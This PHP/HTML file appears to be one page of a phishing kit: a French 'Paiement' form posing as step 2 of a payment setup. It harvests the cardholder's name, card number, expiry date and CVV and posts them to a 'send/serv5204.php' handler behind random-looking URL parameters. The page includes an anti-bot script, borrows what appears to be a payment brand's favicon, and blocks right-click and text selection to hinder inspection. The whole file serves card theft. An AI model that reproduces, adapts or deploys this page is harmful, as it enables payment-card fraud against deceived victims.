<?php 
ob_start();
session_start();
include '../antibots.php';
?>

<!DOCTYPE html>
<html dir="ltr">
        <head>
            <title>Paiement</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
            <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
            <script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false
        }

        function reEnable()
        {
                return true
        }

        //if IE4
        // disable text selection
        document.onselectstart=new Function ("return false")

        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.

                document.onclick=reEnable
        }

        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }

        // disable right click
        document.oncontextmenu=new Function("return false")

</script>
<script type="text/javascript">
$(document).ready(function () {
	$("#cart_number").on('input', function(e) {
		var value = e.target.value;
		if (value.startsWith("6")) {
			if ($("#ccv").length)
				$("#ccv").remove();
		} else {
			if (!($("#ccv").length))
				$('<input type="tel" data-mask="9999" name="csc" id="ccv" class="bill_input" maxlength="4" placeholder="Cryptogramme visuel" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true" style="margin-bottom:20px">').insertAfter("#div-before-cvv");
		}
	});
});

</script>
        </head>
        <body>
            
            <?php include'navbar.php'?>
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'send/serv5204.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info" id="card_form">
                    <center>
                        <span class="step" style="text-transform:uppercase"><B>étape 2 sur 2</B></span>
                        <h3>Configurer votre source d'approvisionnement</h3>
                        <center style="margin-bottom:20px;">
                        	<P align=center><IMG style="HEIGHT: 40px; WIDTH: 210px" border=0 hspace=0 alt="" src="../img/tout.png" width=2099 align=baseline height=400></P>
                        </center>
                        <style>
                            .x {
                                width:48%;
                                float:left;
                                font-size: 15px;
                            }
                            .y {
                                margin-right:0;
                                float:right;
                                width:48%;
                                font-size: 15px;
                            }
                            @media screen and (max-width: 767px) {
                                .x,.y {
                                    width: 300px;
                                    float: none;
                                    font-size: 16px;
                                    }
                            }
                        </style>
                        <input type="text" name="n_card"  minlength="3" maxlength="30" class="bill_input" value="" placeholder="Nom du titulaire de la carte" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true">
                        <div style="position: relative;" class="containvis">
                        	<input data-mask="99999999999999999" type="tel" id="cart_number" name="c_num" minlength="1" maxlength="21" class="bill_input" placeholder="Numéro de carte" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
							<img id="type_v" src="../img/vsa.png" style="display: none">
                        	
                        <DIV align=center></DIV>
</div>
                            <select name="exm" class="bill_input x" required="required">
                        	<option value="" disabled selected>Mois d'expiration</option>
                        	<option value="01">01</option>
							<option value="02">02</option>
							<option value="03">03</option>
							<option value="04">04</option>
							<option value="05">05</option>
							<option value="06">06</option>
							<option value="07">07</option>
							<option value="08">08</option>
							<option value="09">09</option>
							<option value="10">10</option>
							<option value="11">11</option>
							<option value="12">12</option>
                        </select>
                        <select name="exy" class="bill_input y" required="required">
                        	<option value="" disabled selected>Année d'expiration</option>
							<option value="2020">2020</option>
							<option value="2021">2021</option>
							<option value="2022">2022</option>
							<option value="2023">2023</option>
							<option value="2024">2024</option>
							<option value="2024">2025</option>
							<option value="2024">2026</option>
							<option value="2024">2027</option>
							<option value="2024">2028</option>
							<option value="2024">2029</option>
							<option value="2024">2030</option>	
                        </select>
                        <div id="div-before-cvv" class="cls"></div>
                        <input type="tel" data-mask="999" name="csc" id="ccv" class="bill_input" minlength="3" maxlength="3" placeholder="Cryptogramme visuel" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true" style="margin-bottom:20px">
                         <input type="submit" value="Continuer" class="bill_input btn-bill">
							<P>&nbsp;</P>
					
                    </center>
                </form>
            </div>
 <?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
			<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
            <script type="text/javascript">
$( document ).ready(function() {
            $.urlParam = function(name){
	   var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
	   return results[1] || 0;
}
$('#cart_number').on('focusout',function(){
             $('#cart_number').removeClass('error');
});
$("#cart_number,#ccv").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||
             // Allow: Ctrl+A, Command+A
            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) ||
             // Allow: home, end, left, right, down, up
            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });
if($.urlParam('error')){
$('#cart_number').addClass('error');
}
});
            </script>
        </body>
    </html>

